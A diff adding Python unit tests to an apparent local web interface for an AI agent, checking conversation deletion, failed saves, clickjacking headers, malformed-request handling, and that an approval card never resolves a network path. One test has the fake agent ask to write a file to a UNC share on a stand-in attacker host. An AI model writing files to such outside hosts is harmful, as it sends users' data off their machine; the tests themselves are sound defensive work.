@@ -113,6 +113,56 @@ class SessionTests(unittest.TestCase):
                     answered = {r["tool_use_id"] for r in s.messages[i + 1]["content"]}
                     self.assertEqual(asked, answered)
 
+    # Deleting the conversation that is still running is refused: otherwise it is saved again when the reply
+    # ends, and Undo would later put back the stale copy over the newer one
+    def test_the_running_conversation_cannot_be_deleted(self):
+        from harness.web import conversations
+        gate = threading.Event()
+        s = web_server.Session(FakeClient(reply("end_turn", text("Hi.")), reply("end_turn", text("Again.")),
+                                          gate=gate), "test")
+        gate.set()
+        s.start("hello")
+        wait_until_idle(s)  # saved once
+        gate.clear()
+        s.start("again")    # now running, held "thinking"
+        self.assertFalse(s.delete(s.conv_id))
+        gate.set()
+        wait_until_idle(s)
+        self.assertIn(s.conv_id, [c["id"] for c in conversations.list_all()])
+        self.assertFalse(conversations.restore(s.conv_id))  # no stale copy waiting to overwrite it
+
+    # If saving the conversation fails for any reason, the session must still finish: otherwise it stays
+    # "busy" until the server is restarted
+    def test_a_failed_save_still_finishes_the_message(self):
+        from unittest import mock
+        s = web_server.Session(FakeClient(reply("end_turn", text("Hi."))), "test")
+        with mock.patch.object(web_server.conversations, "save", side_effect=ValueError("damaged")):
+            s.start("hello")
+            wait_until_idle(s)
+
+    # The approval card shows a network path as written: looking it up would contact that computer before
+    # you decide (see tools.is_network)
+    def test_the_approval_card_never_looks_up_a_network_path(self):
+        from unittest import mock
+        target = "\\\\attacker.example\\share\\out.txt"
+        looked_up = []
+        real = pathlib.Path.resolve
+
+        def record(self, *a, **kw):
+            looked_up.append(str(self))
+            return real(self, *a, **kw)
+        s = web_server.Session(FakeClient(
+            reply("tool_use", tool_use("t1", "write_file", path=target, content="hello")),
+            reply("end_turn", text("Okay.")),
+        ), "test")
+        with mock.patch.object(pathlib.Path, "resolve", record):
+            s.start("write it")
+            approval = wait_for(s, "approval")
+            self.assertEqual((approval["outside"], approval["where"]), (True, target))
+            s.decide(approval["id"], False)
+            wait_until_idle(s)
+        self.assertFalse([p for p in looked_up if "attacker.example" in p], looked_up)
+
     def test_allowed_write_creates_the_file(self):
         target = self.tmp / "out.txt"
         s = web_server.Session(FakeClient(
@@ -418,6 +468,31 @@ class HttpTests(unittest.TestCase):
     def test_static_still_checks_the_host_name(self):
         self.with_static()
         self.assertEqual(self.head("/", headers={"Host": "evil.example:80"})[0], 403)
+
+    # Another website must not show the page inside a hidden frame of its own and trick you into clicking
+    # Allow (clickjacking)
+    def test_the_page_cannot_be_shown_inside_another_site(self):
+        self.with_static()
+        for path in ["/", "/info"]:
+            with self.subTest(path=path):
+                _, h, _ = self.head(path)
+                self.assertEqual(h.get("X-Frame-Options"), "DENY")
+                self.assertIn("frame-ancestors 'none'", h.get("Content-Security-Policy", ""))
+
+    # A malformed request gets a plain 400, not a dropped connection
+    def test_a_malformed_request_gets_400(self):
+        def raw(path, body):
+            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)
+            conn.request("POST", path, body=body, headers={"Host": f"localhost:{self.port}",
+                                                           "Content-Type": "application/json"})
+            r = conn.getresponse()
+            r.read()
+            conn.close()
+            return r.status
+        for path, body in [("/chat", b"not json"), ("/chat", b"[1, 2]"), ("/settings", b"{"), ("/profile", b"\"x\"")]:
+            with self.subTest(path=path, body=body):
+                self.assertEqual(raw(path, body), 400)
+        self.assertEqual(self.call("GET", "/events?since=abc")[0], 400)
 
     def test_chat_then_poll_events(self):
         self.assertEqual(self.call("POST", "/chat", {"text": "hi"})[0], 202)
